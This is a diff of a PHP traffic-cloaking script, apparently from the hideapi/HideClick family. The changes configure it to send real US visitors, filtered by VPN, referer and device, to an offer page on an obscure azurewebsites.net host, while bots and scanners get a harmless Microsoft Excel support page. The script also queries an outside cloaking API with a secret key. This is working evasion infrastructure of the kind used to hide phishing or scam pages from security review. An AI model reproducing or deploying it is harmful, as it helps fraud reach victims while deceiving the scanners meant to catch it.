@@ -3,8 +3,8 @@
 $HCSET['PASSIVE'] = false;
 
 /* Required settings     */
-$HCSET['OFFER_PAGE'] = 'https://appuiyio-exfpdyb8bwdnh66776-gucaetfbdxdmckf7.eastus-01.azurewebsites.net/';//PHP/HTML file or URL offer used for real users
-$HCSET['WHITE_PAGE'] = 'https://support.microsoft.com/en-us/office/excel-functions-alphabetical-b3944572-255d-4efb-bb96-c6d90033e188';//PHP/HTML file or URL used for bots
+$HCSET['OFFER_PAGE'] = 'appuiyio-exfpdyb8bwdnh66776-gucaetfbdxdmckf7.eastus-01.azurewebsites.net';//PHP/HTML file or URL offer used for real users
+$HCSET['WHITE_PAGE'] = 'https://support.microsoft.com/en-us/office/export-an-excel-table-to-sharepoint-974544f9-94bc-4aa8-9159-97282d256dab';//PHP/HTML file or URL used for bots
 $HCSET['DEBUG_MODE'] = 'off';// replace "on" with "off" to switch from debug to production mode
 /*********************************************/
 /* Available additional settings  */
@@ -14,21 +14,21 @@ $HCSET['FILTER_GEO_MODE'] = 'allow'; // string(allow|reject)
 $HCSET['FILTER_GEO_LIST'] = 'US'; // string([2Chars country codes])
 
 /* DEVICE FILTERS */
-$HCSET['FILTER_DEV_MODE'] = 'allow'; // 'allow|reject'
-$HCSET['FILTER_DEV_LIST'] = 'm_Android,m_iOS,d_Windows,d_macOS'; // string([d_Windows|m_Android|m_iOS|d_macOS|m_other|d_other]);
+$HCSET['FILTER_DEV_MODE'] = ''; // 'allow|reject'
+$HCSET['FILTER_DEV_LIST'] = ''; // string([d_Windows|m_Android|m_iOS|d_macOS|m_other|d_other]);
 
 /* UTM FILTERS */
 $HCSET['FILTER_UTM_MODE'] = ''; // 'allow|reject'
 $HCSET['FILTER_UTM_LIST'] = ''; // 'regExp()';
 
 /* REFERER FILTERS */
-$HCSET['FILTER_REF_MODE'] = 'allow'; // 'allow|reject'
-$HCSET['FILTER_REF_LIST'] = 'www.google.com'; // 'regExp()';
+$HCSET['FILTER_REF_MODE'] = ''; // 'allow|reject'
+$HCSET['FILTER_REF_LIST'] = ''; // 'regExp()';
 $HCSET['FILTER_NOREF'] = ''; // 'allow|reject';
 
 /* NETWORK FILTERS */
 $HCSET['FILTER_NET_MODE'] = 'reject'; // 'allow|reject'
-$HCSET['FILTER_NET_LIST'] = 'vpn,corporate'; // string([vpn|mobile|residential|corporate]);
+$HCSET['FILTER_NET_LIST'] = 'vpn'; // string([vpn|mobile|residential|corporate]);
 
 /* NETWORK FILTERS */
 $HCSET['FILTER_BRO_MODE'] = 'allow'; // 'allow|reject'
@@ -41,12 +41,12 @@ $HCSET['mlSet'] = '';
 /* 'meta' - Use meta refresh to redirect visitors. (default method due to maximum compatibility with different hostings) */
 /* '302' -  Redirect visitors using 302 header (best method if the goal is maximum transitions).*/
 /* 'iframe' - Open URL in iframe. (recommended and safest method. requires the use of a SSL to work properly) */
-$HCSET['OFFER_METHOD'] = '302';
+$HCSET['OFFER_METHOD'] = 'meta';
 
 /* WHITE_PAGE display method. Available options: curl, 302 */
 /* 'curl' - uses a server request to display third-party whitepage on your domain */
 /* '302' -  uses a 302 redirect to redirect the request to a third-party domain (only for trusted accounts)  */
-$HCSET['WHITE_METHOD'] = '302';
+$HCSET['WHITE_METHOD'] = 'curl';
 
 /* change 'false' to 'true' to permanently block the IP from which the DDOS attack is coming */
 $HCSET['BLOCK_DDOS'] = false;
@@ -79,7 +79,7 @@ if (function_exists('debug_backtrace') && sizeof(debug_backtrace()) > 2) {
     echo "WARNING: INFINITE RECURSION PROTECTION";
     die();
 }
-$HCSET['VERSION'] = 20240129;
+$HCSET['VERSION'] = 20240829;
 /* dirty fix!!! uncomment only if problem with IP detection!!! */
 //if(!empty($_SERVER['HTTP_X_REAL_IP'])) $_SERVER['REMOTE_ADDR']=$_SERVER['HTTP_X_REAL_IP'];
 
@@ -411,7 +411,7 @@ function apiRequest($ip, $port, $HCSET, $HCSETdata)
     $host = gethostbyname('api.hideapi.xyz');
     if($host=='api.hideapi.xyz') $host = gethostbyname('hideapi.net');
 
-    $url = 'http://'.$host.'/basic?ip=' . $ip . '&port=' . $port . '&key=' . $HCSET['API_SECRET_KEY'] . '&sign=v21082589651&js=false&stage='.$HCSET['stage'];
+    $url = 'http://'.$host.'/basic?ip=' . $ip . '&port=' . $port . '&key=' . $HCSET['API_SECRET_KEY'] . '&sign=v2300794261&js=false&stage='.$HCSET['stage'];
     if (!empty($HCSET['PASSIVE'])) $url .= '&PASSIVE=' . $HCSET['PASSIVE'];
     if (!empty($HCSET['DEBUG_MODE'])) $url .= '&DEBUG_MODE=' . $HCSET['DEBUG_MODE'];
     if (!empty($HCSET['banReason'])) $url .= '&banReason=' . $HCSET['banReason'];
@@ -649,9 +649,9 @@ function self_test_request($HCSET) {
     if ($HCSET['BLOCK_DDOS']) {
         @file_put_contents('dummyDDOS.txt', '');
         if (!is_file('dummyDDOS.txt')) {
-            $errors[] = 'To make the DELAY_START filter work, you need to manually create a <b>dummyDDOS.txt</b> in the directory where the script is located. For example using the <code>touch ' . getcwd() . '/dummyDDOS.txt </code> in terminal) <br>';
+            $errors[] = 'To make the BLOCK_DDOS filter work, you need to manually create a <b>dummyDDOS.txt</b> in the directory where the script is located. For example using the <code>touch ' . getcwd() . '/dummyDDOS.txt </code> in terminal) <br>';
         } else if (!is_writable('dummyDDOS.txt')) {
-            $errors[] = 'To make the DELAY_START filter work, you need to give <b>dummyDDOS.txt</b>  read and write permissions. For example using the <code>chmod 666 ' . getcwd() . '/dummyDDOS.txt </code> in terminal) <br>';
+            $errors[] = 'To make the BLOCK_DDOS filter work, you need to give <b>dummyDDOS.txt</b>  read and write permissions. For example using the <code>chmod 666 ' . getcwd() . '/dummyDDOS.txt </code> in terminal) <br>';
         }
     }
     // Customer IP check
